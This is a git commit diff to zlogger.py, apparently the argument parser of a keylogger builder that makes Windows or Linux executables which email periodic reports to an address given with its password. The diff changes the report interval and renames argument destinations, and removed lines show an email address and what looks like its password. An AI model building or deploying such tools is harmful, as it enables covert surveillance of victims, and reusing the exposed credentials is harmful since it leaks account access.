ade22adf8bee34320b7c0c9ccc798095678e2c44
TrackThisGuy <46363162+TrackThisGuy@users.noreply.github.com>
2019-01-04 03:49:10 +0000

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -9,13 +9,13 @@ WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/S
 def get_arguments():
     parser = argparse.ArgumentParser(description='ZLogger v2.0')
     parser._optionals.title = "Optional Arguments"
-    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=20)
+    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
 
     required_arguments = parser.add_argument_group('Required Arguments')
-    required_arguments.add_argument("-e", "--email", dest="trackthisguy@outlook.com", help="Email address to send reports to.")
-    required_arguments.add_argument("-p", "--password", dest="TrackThis", help="Password for the email address given in the -e argument.")
+    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
+    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
     required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
     return parser.parse_args()
 
